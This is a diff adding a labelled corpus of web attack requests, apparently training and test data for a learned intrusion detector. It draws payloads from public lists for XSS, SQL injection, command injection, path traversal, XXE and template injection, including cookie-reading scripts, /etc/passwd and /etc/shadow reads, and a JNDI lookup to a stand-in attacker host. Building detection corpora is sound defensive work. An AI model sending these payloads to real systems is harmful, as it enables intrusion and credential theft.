@@ -1,0 +1,986 @@
+# Corpus d'attaques pour le modele appris (S4, ADR 0029) : famille<TAB>requete.
+#
+# Les charges utiles viennent de deux listes publiques, posees ici dans des chemins et des
+# parametres plausibles pour ressembler a ce qu'un journal d'acces contient vraiment :
+#   - SecLists (Daniel Miessler et contributeurs), licence MIT
+#     https://github.com/danielmiessler/SecLists
+#   - PayloadsAllTheThings (swisskyrepo et contributeurs), licence MIT
+#     https://github.com/swisskyrepo/PayloadsAllTheThings
+# Le jeu CSIC 2010, prevu au plan, n'a pas ete retenu : ni la page du CSIC ni les copies publiques
+# n'enoncent de conditions d'usage.
+#
+# Les familles MODELE et XXE servent d'epreuve : elles sont retirees de l'apprentissage pour
+# mesurer ce que le modele fait d'une forme qu'il n'a jamais vue.
+XSS	/catalogue?nom=javascript:alert('xss')&page=15
+COMMANDE	/boutique/produit?page=%3Becho%20JSDBIM$((99%2B35))$(echo%20JSDBIM)JSDBIM%22
+TRAVERSEE	/fichiers/....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+COMMANDE	/produits?code=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520XBWWVF%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25204%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%257C
+XXE	/catalogue?page=%3Cxml%20ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG%20SRC%3D%22javas%3C%21--%20--%3Ecript%3Aalert%28%27XSS%27%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2Fxml%3E%3CSPAN%20DATASRC%3D%22%23xss%22%20DATAFLD%3D%22B%22%20DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN%20DATASRC%3D%23I%20DATAFLD%3DC%20DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E
+XXE	/actualites?ref=<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+COMMANDE	/api/v1/equipements?q=%250aecho%2520QUHONN%24%28%2815%252B27%29%29%24%28echo%2520QUHONN%29QUHONN%257C
+MODELE	/produits?filtre=%24%7B42%2A42%7D&page=13
+XXE	/index.php?filtre=<test></test>
+SQLI	/api/v1/equipements?code=%27%29%29%20or%20%28%28%27x%27%29%29%3D%28%28%27x
+SQLI	/article?page=' or ''='&page=7
+COMMANDE	/inscription/etudiant?code=%3B%20str%3D%24%28echo%20CHSJVY%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527
+TRAVERSEE	/article?ref=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+TRAVERSEE	/static//var/apache/log
+TRAVERSEE	/fichiers//proc/self/environ
+MODELE	/catalogue?annee=[[${42*42}]]
+COMMANDE	/catalogue?q=%27%26%26echo%24IFSQCRXUV%24%28%2817%252B13%29%29%24%28echo%24IFSQCRXUV%29QCRXUV&page=19
+SQLI	/catalogue?filtre="*"
+TRAVERSEE	/recherche?q=///////../../../etc/passwd
+TRAVERSEE	/recherche?recherche=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+COMMANDE	/bibliotheque/ouvrage?recherche=%7C%20%5B%201%20-ne%20%24%28echo%20AJEWOJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27
+XSS	/intranet/dossier?tri=%3Cscript%3E%20document.getElementById%28%2522safe123%2522%29.click%3Dfunction%28%29%2B%7Balert%28Safe.get%28%29%29%3B%7D%20document.getElementById%28%2522safe123%2522%29.click%28%7B%27type%27%3A%27click%27%2C%27isTrusted%27%3Atrue%7D%29%3B%20%3C%2Fscript%3E
+XSS	/article?filtre=%3Cscript%3E%20%20%20%20%20function%20b%28%29%20%7B%20return%20Safe.get%28%29%3B%20%7D%20alert%28b%28%7Btype%3AString.fromCharCode%2899%2C108%2C105%2C99%2C107%29%2CisTrusted%3Atrue%7D%29%29%3B%20%3C%2Fscript%3E&page=11
+COMMANDE	/catalogue?code=%2520echo%2520WIJKEI%24%28%280%252B41%29%29%24%28echo%2520WIJKEI%29WIJKEI%5C
+COMMANDE	/index.php?page=%253B%2520str%253D%2524%2528echo%2520YQOLOU%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25201%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2F%2F
+XSS	/produits?nom=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Bjavascript%26colon%3Balert%281%29%22%2F%3E%3F
+SQLI	/api/v1/equipements?filtre=admin%27%20or%20%271%27%3D%271%27%2F%2A
+SQLI	/espace/connexion?utilisateur=%27%2A%27&motdepasse=xxxxxxx
+XXE	/inscription/etudiant?filtre=%foo;&page=4
+XSS	/boutique/produit?annee=%3Cmath%3E%3Ca%20xlink%3Ahref%3D%22%2F%2Fjsfiddle.net%2Ft846h%2F%22%3Eclick
+TRAVERSEE	/fichiers/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%2500
+SQLI	/api/v1/equipements?q=' or ''^'&page=5
+SQLI	/recherche?recherche=or 1=1
+TRAVERSEE	/telechargement/../../../../../../../../../../etc/passwd
+SQLI	/produits?id=1%2F%2A%211111%27%2A%2F
+TRAVERSEE	/static//etc/group
+TRAVERSEE	//etc/php.d/ldap.ini
+TRAVERSEE	/documents/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+XSS	/bibliotheque/ouvrage?nom=<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>&page=7
+TRAVERSEE	/catalogue?annee=/etc/php.d/pgsql.ini
+SQLI	/catalogue?annee=admin%22%20or%20%221%22%3D%221%22--
+XSS	/actualites?annee=%3Cinput%20value%3D%3C%3E%3Ciframe%2Fsrc%3Djavascript%3Aconfirm%281%29&page=20
+COMMANDE	/recherche?id=%22|echo%20AJPXDT$((8%2B89))$(echo%20AJPXDT)AJPXDT%26
+TRAVERSEE	/documents/../../logs/error.log
+TRAVERSEE	/static//..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/passwd
+COMMANDE	/article?tri='&echo$IFSJGGFVO$((61%2B53))$(echo$IFSJGGFVO)JGGFVO&
+TRAVERSEE	/recherche?annee=..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_l%20og
+TRAVERSEE	/actualites?tri=%2Fetc%2Fvfstab
+TRAVERSEE	//.profile
+XSS	/api/v1/equipements?q=<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
+MODELE	/boutique/produit?annee={{''.__class__.__mro__[1].__subclasses__()}}
+XSS	/boutique/produit?tri=%3Cimg%20src%20%3Fitworksonchrome%3F%5C%2Fonerror%20%3D%20alert%281%29%3F%3F%3F
+COMMANDE	/catalogue?recherche=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520BFMCIE%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25204%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%252522&page=4
+COMMANDE	/intranet/dossier?tri=%3B%20str%3D%24%28echo%20EYUAUR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C&page=20
+XSS	/intranet/dossier?ref=%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27https%3A%2F%2Fwww.google.com%2F%27%29%3B%3E&page=6
+COMMANDE	/article?code=%2522%250A%2520str%253D%2524%2528echo%2520LZSVGK%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25209%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520
+COMMANDE	/intranet/dossier?recherche=%253B%2520str%253D%2524%2528echo%2520ZSSQMT%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25201%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520
+COMMANDE	/inscription/etudiant?annee=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520UIVPGT%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25209%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%252526
+SQLI	/api/v1/equipements?filtre="^"&page=11
+XSS	/catalogue?code=%3Ciframe%2Fonreadystatechange%3Dalert%281%29
+SQLI	/bibliotheque/ouvrage?annee=admin') or ('1'='1'#
+COMMANDE	/actualites?page=%22%0A%20str%3D%24%28echo%20GZRNZB%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527
+COMMANDE	/inscription/etudiant?id=%26%26echo%20PGMBBO$((3%2B90))$(echo%20PGMBBO)PGMBBO'
+XSS	/notes/releve?code=%3Ciframe%20onload%3D%2522write%28%27%3Cscript%3E%27%252Blocation.hash.substr%281%29%252B%27%3C%2Fscript%3E%27%29%2522%3E%3C%2Fiframe%3E%23var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2C%20true%29%3Bxhr.onload%20%3D%20function%28%29%20%7B%20alert%28xhr.responseText.match%28%2Fcookie%20%3D%20%27%28.%2A%3F%29%27%2F%29%5B1%5D%29%20%7D%3Bxhr.send%28%29%3B&page=17
+TRAVERSEE	/api/v1/equipements?ref=C%3A%2FWindows%2Fwin.ini
+TRAVERSEE	/intranet/dossier?nom=%2Fvar%2Fadm%2Floginlog&page=10
+MODELE	/api/v1/equipements?annee={{42*42}}
+SQLI	/article?id=admin" or "1"="1"#&page=4
+XSS	/actualites?page=%3Csvg%2Fonload%3Dalert%281%29&page=3
+XXE	/bibliotheque/ouvrage?code=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fissue%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E&page=2
+TRAVERSEE	/boutique/produit?recherche=%2Fusr%2Flocal%2Fetc%2Fpureftpd.pdb
+XSS	/catalogue?page=<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+TRAVERSEE	/api/v1/equipements?recherche=..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+COMMANDE	/api/v1/equipements?page=%3Becho%24IFSZIROGF%24%28%286%252B49%29%29%24%28echo%24IFSZIROGF%29ZIROGF%2F%2F
+XSS	/actualites?annee=<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+TRAVERSEE	/inscription/etudiant?page=....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+TRAVERSEE	/catalogue?nom=%2FProgram%20Files%5CApache%20Group%5CApache%5Clogs%5Cerror.log
+TRAVERSEE	/documents//usr/local/php5/httpd.conf
+SQLI	/produits?q=" or true--&page=15
+SQLI	/boutique/produit?code=or 1=1/*&page=2
+SQLI	/index.php?annee=admin' or '1'='1'/*
+COMMANDE	/boutique/produit?page='echo$IFSXCUTCE$((23%2B12))$(echo$IFSXCUTCE)XCUTCE%7C&page=15
+SQLI	/produits?recherche=%27%20or%20%27%27%20%27
+COMMANDE	/notes/releve?annee=%252527%250A%2520str%253D%2524%2528echo%2520NZALSY%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25207%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%2527&page=15
+XSS	/inscription/etudiant?q=<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
+COMMANDE	/produits?tri=%2522%250A%2520str%253D%2524%2528echo%2520RSPYHG%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25201%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%252526
+COMMANDE	/index.php?id=%2526%2526echo%2520KHAVOV%24%28%2890%252B77%29%29%24%28echo%2520KHAVOV%29KHAVOV
+SQLI	/article?ref=admin%22%29%20or%20%28%221%22%3D%221&page=16
+TRAVERSEE	/recherche?q=Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
+XXE	/bibliotheque/ouvrage?q=%3C%21DOCTYPE%20xxe%20%5B%20%3C%21ENTITY%20%25%20file%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fissue%22%3E%3C%21ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fexample.com%2Fevil.dtd%22%3E%25dtd%3B%25trick%3B%5D%3E&page=10
+XSS	/actualites?annee=%3Ciframe%20id%3D%2522ifra%2522%20src%3D%2522%2F%2522%3E%3C%2Fiframe%3E%20%3Cscript%3Eifr%20%3D%20document.getElementById%28%27ifra%27%29%3B%20ifr.contentDocument.write%28%2522%3Cscr%2522%20%252b%20%2522ipt%3Etop.foo%20%3D%20Object.defineProperty%3C%2Fscr%2522%20%252b%20%2522ipt%3E%2522%29%3B%20foo%28window%2C%20%27Safe%27%2C%20%7Bvalue%3A%7B%7D%7D%29%3B%20foo%28Safe%2C%20%27get%27%2C%20%7Bvalue%3Afunction%28%29%20%7B%20%20%20%20return%20document.cookie%20%7D%7D%29%3B%20alert%28Safe.get%28%29%29%3B%3C%2Fscript%3E&page=7
+TRAVERSEE	/catalogue?q=../../../../../../../etc/httpd/logs/acces.log&page=9
+TRAVERSEE	/static/../../../apache/logs/error.log
+MODELE	/actualites?annee=%7B%7B%3D42%2A42%7D%7D&page=5
+SQLI	/espace/connexion?utilisateur=%22%20%22&motdepasse=xxxxx
+TRAVERSEE	/fichiers//Volumes/webBackup/private/etc/httpd/httpd.conf.default
+SQLI	/login?utilisateur=admin%27%29%20or%20%28%271%27%3D%271&motdepasse=xxxx
+SQLI	/index.php?annee=%27%20%27
+MODELE	/actualites?annee=%7B%5Exyzm42%7D1764%7B%2Fxyzm42%7D
+SQLI	/produits?filtre=%27%2A%27
+XSS	/intranet/dossier?ref=%3Csvg%3E%3Cscript%20onlypossibleinopera%3A-%29%3E%20alert%281%29
+SQLI	/produits?nom=admin%22%20or%20%221%22%3D%221%22%2F%2A&page=18
+COMMANDE	/recherche?ref=%27%3Becho%2520PYWYEX%24%28%2888%252B85%29%29%24%28echo%2520PYWYEX%29PYWYEX%22&page=7
+COMMANDE	/actualites?q=%253B%2520str%253D%2524%2528echo%2520CHSJVY%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25208%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%252527
+TRAVERSEE	/catalogue?id=/var/adm/log/asppp.log
+TRAVERSEE	/inscription/etudiant?tri=/var/log/exim/mainlog&page=1
+SQLI	/api/v1/equipements?code=1%3B%20DROP%20TABLE%20etudiants--&page=3
+TRAVERSEE	/inscription/etudiant?tri=/usr/local/etc/php.ini
+SQLI	/inscription/etudiant?ref=admin') or '1'='1
+XSS	/api/v1/equipements?annee=%3Cscript%3Ealert%28document.documentElement.innerHTML.match%28%2F%27%28%5B%5E%27%5D%252b%29%2F%29%5B1%5D%29%3C%2Fscript%3E
+TRAVERSEE	/..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log
+SQLI	/boutique/produit?nom=admin' or '1'='1&page=18
+SQLI	/index.php?nom=admin"/*&page=15
+MODELE	/recherche?page=%3C%25%3D42%2A42%20%25%3E
+COMMANDE	/produits?nom=%257C%2520%255B%25204%2520-ne%2520%2524%2528echo%2520PCTUKX%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%2527
+COMMANDE	/bibliotheque/ouvrage?recherche=%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20PRKGES%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526
+TRAVERSEE	/notes/releve?tri=../../../../../var/log/error_log
+SQLI	/actualites?q=%22%20%22&page=19
+SQLI	/index.php?annee=or%201%3D1--&page=7
+SQLI	/boutique/produit?filtre=1' ORDER BY 10--&page=19
+SQLI	/recherche?tri=or%201%3D1%23
+COMMANDE	/bibliotheque/ouvrage?page=%253B%2520str%253D%2524%2528echo%2520WLZIBA%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25206%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2527
+SQLI	/produits?nom=' or true--&page=16
+COMMANDE	/inscription/etudiant?recherche=%7C%7Cecho$IFSVKQXGG$((70%2B99))$(echo$IFSVKQXGG)VKQXGG&
+XXE	/article?nom=%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fshadow%22%20%3E%5D%3E
+XSS	/bibliotheque/ouvrage?filtre=%3Ciframe%2Fsrc%20%5C%2F%5C%2Fonload%20%3D%20prompt%281%29
+MODELE	/intranet/dossier?recherche=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+SQLI	/inscription/etudiant?filtre=' OR 1=1--
+MODELE	/actualites?nom={{{42*42}}}
+TRAVERSEE	/documents/../../../../../../../../conf/server.xml
+COMMANDE	/boutique/produit?recherche=%257C%2520%255B%25209%2520-ne%2520%2524%2528echo%2520HHUNZT%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%252526
+COMMANDE	/bibliotheque/ouvrage?page=%253B%2520str%253D%2524%2528echo%2520YCZVOO%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25206%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%25252F%25252F
+COMMANDE	/catalogue?ref=%257C%2520%255B%25206%2520-ne%2520%2524%2528echo%2520CXWPXJ%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%25255C%25255C&page=20
+SQLI	/intranet/dossier?filtre=admin%27%20%23
+SQLI	/bibliotheque/ouvrage?filtre=' OR 1=1--&page=11
+MODELE	/catalogue?ref=<%=42*42 %>
+SQLI	/connexion?utilisateur=%27%20or%20%27%27%26%27&motdepasse=xxxxxxxxx
+COMMANDE	/bibliotheque/ouvrage?annee=%2527%257C%2520%255B%25208%2520-ne%2520%2524%2528echo%2520XOCDUH%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%25255C%25255C&page=6
+TRAVERSEE	/fichiers//logs/access.log
+COMMANDE	/article?page=|echo%20QAVNFZ$((68%2B13))$(echo%20QAVNFZ)QAVNFZ|
+TRAVERSEE	/telechargement//php4\php.ini
+TRAVERSEE	/notes/releve?recherche=/usr/local/lib/php.ini
+XSS	/produits?id=%2527%2522--%253E%253C%252Fstyle%253E%253C%252Fscript%253E%253Cscript%253ERWAR%25280x00010E%2529%253C%252Fscript%253E&page=17
+SQLI	/boutique/produit?id=%27%29%20or%20%28%27x%27%29%3D%28%27x
+SQLI	/bibliotheque/ouvrage?page=%22%20or%20%22%22%2A%22
+TRAVERSEE	/notes/releve?tri=..%2F..%2Fboot.ini
+COMMANDE	/intranet/dossier?nom=%253B%2520str%253D%2524%2528echo%2520WSZRIR%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25205%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%252527
+XSS	/catalogue?id=%3Cobject%20data%3D%2522data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4%3D%2522%3E&page=16
+MODELE	/index.php?ref=%3C%25%3D42%2A42%20%25%3E
+MODELE	/bibliotheque/ouvrage?tri={42*42}
+SQLI	/index.php?q=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--
+XSS	/article?tri=<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>&page=6
+XXE	/article?annee=<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+XSS	/intranet/dossier?id=<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
+COMMANDE	/inscription/etudiant?nom=%253Becho%24IFSLIWOMV%24%28%2830%252B61%29%29%24%28echo%24IFSLIWOMV%29LIWOMV%22
+TRAVERSEE	/Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3D%3D
+COMMANDE	/produits?recherche=%3Becho%20LSPXCM$((79%2B79))$(echo%20LSPXCM)LSPXCM|&page=1
+SQLI	/intranet/dossier?tri=admin%27%20%23
+COMMANDE	/intranet/dossier?id=%2527%0A%20str%3D%24%28echo%20NZALSY%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27&page=9
+SQLI	/api/v1/equipements?code="^"
+TRAVERSEE	/telechargement/....%5C/....%5C/....%5C/....%5C/....%5C/etc/passwd
+MODELE	/catalogue?code=#{session}
+COMMANDE	/catalogue?code=%250A%2520str%253D%2524%2528echo%2520WBNIBQ%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25203%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%2526
+SQLI	/recherche?tri=admin%27%29%20or%20%28%271%27%3D%271&page=7
+SQLI	/connexion?utilisateur=1%5C&motdepasse=xxxxxx
+XSS	/api/v1/equipements?nom=<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+COMMANDE	/article?q=%27%7C%20%5B%209%20-ne%20%24%28echo%20UUMIWO%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526&page=6
+COMMANDE	/produits?recherche=%0aecho$IFSZOHJGD$((19%2B47))$(echo$IFSZOHJGD)ZOHJGD'
+XSS	/inscription/etudiant?nom=%3Ctextarea%20id%3Dta%3E%3C%2Ftextarea%3E%3Cscript%3Eta.appendChild%28safe123.parentNode.previousSibling.previousSibling.childNodes%5B3%5D.firstChild.cloneNode%28true%29%29%3Balert%28ta.value.match%28%2Fcookie%20%3D%20%27%28.%2A%3F%29%27%2F%29%5B1%5D%29%3C%2Fscript%3E&page=2
+XXE	/inscription/etudiant?recherche=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fshadow%22%20%3E%5D%3E
+SQLI	/bibliotheque/ouvrage?recherche=admin%27%20or%20%271%27%3D%271%27%23
+XXE	/inscription/etudiant?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fboot.ini%22%20%3E%5D%3E&page=7
+SQLI	/actualites?annee=admin' or 1=1#
+COMMANDE	/inscription/etudiant?id=%257C%2520%255B%25201%2520-ne%2520%2524%2528echo%2520DAJIYU%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%257C
+SQLI	/notes/releve?filtre=%22%20or%20%22%22%5E%22
+TRAVERSEE	/documents//etc/hostname.ieef0
+TRAVERSEE	/notes/releve?filtre=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA%3D%3D
+SQLI	/intranet/dossier?recherche=SELECT%201%2C2%2CIF%28SUBSTR%28%40%40version%2C1%2C1%29%3C5%2CBENCHMARK%282000000%2CSHA1%280xDE7EC71F1%29%29%2CSLEEP%281%29%29%2F%2A%27XOR%28IF%28SUBSTR%28%40%40version%2C1%2C1%29%3C5%2CBENCHMARK%282000000%2CSHA1%280xDE7EC71F1%29%29%2CSLEEP%281%29%29%29OR%27%7C%22XOR%28IF%28SUBSTR%28%40%40version%2C1%2C1%29%3C5%2CBENCHMARK%282000000%2CSHA1%280xDE7EC71F1%29%29%2C%E2%80%8BSLEEP%281%29%29%29OR%22%2A%2F%20FROM%20some_table%20WHERE%20ex%20%3D%20ample&page=17
+XSS	/recherche?page=%3Ciframe%20%20src%3Dj%26NewLine%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3Bv%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bs%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bc%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Br%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bi%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bp%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bt%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26colon%3Ba%26New
+SQLI	/bibliotheque/ouvrage?nom=admin') or '1'='1'/*
+SQLI	/intranet/dossier?id=" or ""&"&page=1
+COMMANDE	/catalogue?nom=&echo%20NOKSUR$((8%2B35))$(echo%20NOKSUR)NOKSUR%5C%5C
